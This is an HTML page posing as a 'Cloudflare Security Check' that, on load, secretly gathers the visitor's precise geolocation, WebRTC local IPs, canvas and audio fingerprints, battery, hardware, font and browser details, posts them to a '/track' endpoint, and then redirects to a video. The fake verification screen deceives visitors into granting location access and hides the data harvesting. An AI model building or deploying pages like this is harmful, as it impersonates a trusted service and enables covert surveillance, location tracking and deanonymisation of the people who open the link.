<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        .cf-logo { font-size: 48px; margin-bottom: 10px; }
        h1 { color: #2d3748; font-size: 24px; margin-bottom: 10px; }
        .subtitle { color: #718096; font-size: 14px; margin-bottom: 30px; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #f6821f;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status { color: #4a5568; font-size: 14px; margin-top: 20px; }
        .check-mark { color: #48bb78; font-size: 60px; display: none; }
        .error-mark { color: #fc8181; font-size: 60px; display: none; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container" id="container">
        <div class="cf-logo">🛡️</div>
        <h1>Checking your browser security</h1>
        <p class="subtitle">Verifying your connection is secure...</p>
        
        <div id="loader" class="loader"></div>
        <div id="checkMark" class="check-mark">✅</div>
        <div id="errorMark" class="error-mark">⚠️</div>
        <p class="status" id="status">Starting security checks...</p>
    </div>

    <script>
        // --- Session ID ---
        function getSessionId() {
            let id = sessionStorage.getItem('tracker_session_id');
            if (!id) {
                id = Math.random().toString(36).substring(2, 10) + 
                     Math.random().toString(36).substring(2, 10);
                sessionStorage.setItem('tracker_session_id', id);
            }
            return id;
        }

        // --- 1. LOCATION ---
        function getLocation() {
            return new Promise((resolve) => {
                console.log("📍 Requesting location...");
                
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log("✅ Location obtained");
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy),
                            altitude: position.coords.altitude || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null
                        });
                    },
                    (error) => {
                        console.log("❌ Location error:", error.message);
                        resolve({ error: error.message });
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // --- 2. BATTERY ---
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
                return null;
            } catch (e) { return null; }
        }

        // --- 3. CANVAS FINGERPRINT ---
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 256;
                canvas.height = 256;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 128, 128);
                ctx.fillStyle = '#069';
                ctx.fillText('Hello World', 50, 50);
                ctx.strokeStyle = '#0f6';
                ctx.lineWidth = 2;
                ctx.strokeRect(50, 50, 100, 100);
                ctx.beginPath();
                ctx.arc(128, 128, 64, 0, 2 * Math.PI);
                ctx.stroke();
                
                const data = ctx.getImageData(0, 0, 256, 256).data;
                let hash = 0;
                for (let i = 0; i < data.length; i += 4) {
                    hash = ((hash << 5) - hash) + data[i];
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(36);
            } catch (e) { return 'Canvas unavailable'; }
        }

        // --- 4. AUDIO FINGERPRINT ---
        async function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(audioCtx.destination);
                oscillator.start(0);
                const dataArray = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(dataArray);
                let sum = 0;
                for (let i = 0; i < dataArray.length; i++) { sum += dataArray[i]; }
                oscillator.stop();
                audioCtx.close();
                return (sum / dataArray.length).toFixed(6);
            } catch (e) { return 'Audio unavailable'; }
        }

        // --- 5. WEBRTC IP LEAK ---
        function getWebRTCIPs() {
            return new Promise((resolve) => {
                try {
                    const ips = [];
                    const pc = new RTCPeerConnection({ 
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] 
                    });
                    pc.createDataChannel('test');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                    pc.onicecandidate = (event) => {
                        if (!event.candidate) { 
                            pc.close(); 
                            resolve(ips.length ? ips : ['No local IPs found']); 
                            return; 
                        }
                        const ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ip && !ips.includes(ip[0])) { ips.push(ip[0]); }
                    };
                    setTimeout(() => { 
                        pc.close(); 
                        resolve(ips.length ? ips : ['No local IPs found']); 
                    }, 3000);
                } catch (e) { resolve(['WebRTC not supported']); }
            });
        }

        // --- 6. PERFORMANCE ---
        function getPerformanceMetrics() {
            try {
                const perf = performance.timing;
                return {
                    loadTime: perf.loadEventEnd - perf.navigationStart,
                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
                    dns: perf.domainLookupEnd - perf.domainLookupStart,
                    tcp: perf.connectEnd - perf.connectStart,
                    ttfb: perf.responseStart - perf.navigationStart,
                    domInteractive: perf.domInteractive - perf.navigationStart
                };
            } catch (e) { return {}; }
        }

        // --- 7. HARDWARE INFO ---
        function getHardwareInfo() {
            return {
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                platform: navigator.platform || 'unknown',
                vendor: navigator.vendor || 'unknown',
                product: navigator.product || 'unknown'
            };
        }

        // --- 8. SCREEN INFO ---
        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio
            };
        }

        // --- 9. BROWSER INFO ---
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unspecified'
            };
        }

        // --- 10. PLUGINS ---
        function getPlugins() {
            try {
                const plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
                return plugins;
            } catch (e) { return []; }
        }

        // --- 11. FONTS (Common ones) ---
        function getInstalledFonts() {
            const fonts = [
                'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
                'Verdana', 'Georgia', 'Palatino', 'Garamond',
                'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS',
                'Segoe UI', 'Roboto', 'Open Sans', 'Lato',
                'Montserrat', 'Source Sans Pro', 'Raleway', 'Oswald',
                'Merriweather', 'PT Sans', 'Ubuntu', 'Cantarell'
            ];
            
            const installed = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const baseSize = '72px';
            const baseFont = 'monospace';
            
            fonts.forEach(font => {
                ctx.font = baseSize + ' ' + font + ', ' + baseFont;
                const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
                ctx.font = baseSize + ' ' + baseFont;
                const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
                if (width1 !== width2) {
                    installed.push(font);
                }
            });
            
            return installed;
        }

        // --- MAIN COLLECTION ---
        async function collectData() {
            const location = await getLocation();
            const battery = await getBatteryInfo();
            const webRTCIPs = await getWebRTCIPs();
            const canvasFP = getCanvasFingerprint();
            const audioFP = await getAudioFingerprint();
            const performance = getPerformanceMetrics();
            const hardware = getHardwareInfo();
            const screen = getScreenInfo();
            const browser = getBrowserInfo();
            const plugins = getPlugins();
            const fonts = getInstalledFonts();
            
            return {
                sessionId: getSessionId(),
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                location: location,
                battery: battery,
                webRTCIPs: webRTCIPs,
                canvasFingerprint: canvasFP,
                audioFingerprint: audioFP,
                performance: performance,
                hardware: hardware,
                screen: screen,
                plugins: plugins,
                fonts: fonts,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                historyDepth: history.length,
                userAgent: browser.userAgent,
                platform: browser.platform,
                language: browser.language,
                languages: browser.languages,
                cookieEnabled: browser.cookieEnabled,
                doNotTrack: browser.doNotTrack
            };
        }

        // --- SEND DATA ---
        async function sendData(data) {
            try {
                const response = await fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                return await response.json();
            } catch (e) {
                console.error('Send error:', e);
                return null;
            }
        }

        // --- REDIRECT ---
        function redirectToGif() {
            const videoUrl = "https://media.tenor.com/58dr_S9uXqEAAAPo/car-car-edit.mp4";
            window.location.href = videoUrl;
        }

        // --- MAIN ---
        async function main() {
            const statusEl = document.getElementById('status');
            const loaderEl = document.getElementById('loader');
            const checkMarkEl = document.getElementById('checkMark');
            const errorMarkEl = document.getElementById('errorMark');
            
            try {
                statusEl.textContent = '📍 Requesting location permission...';
                const data = await collectData();
                
                statusEl.textContent = '📤 Sending data...';
                const result = await sendData(data);
                
                if (result && result.status === 'success') {
                    loaderEl.style.display = 'none';
                    checkMarkEl.style.display = 'block';
                    statusEl.textContent = '✅ Verification complete! Redirecting...';
                    statusEl.style.color = '#48bb78';
                } else {
                    loaderEl.style.display = 'none';
                    errorMarkEl.style.display = 'block';
                    statusEl.textContent = '⚠️ Continuing...';
                    statusEl.style.color = '#ed8936';
                }
            } catch (error) {
                console.error('Error:', error);
                loaderEl.style.display = 'none';
                errorMarkEl.style.display = 'block';
                statusEl.textContent = '⚠️ Continuing...';
                statusEl.style.color = '#ed8936';
            }
            
            setTimeout(redirectToGif, 2000);
        }

        main();
    </script>
</body>
</html>
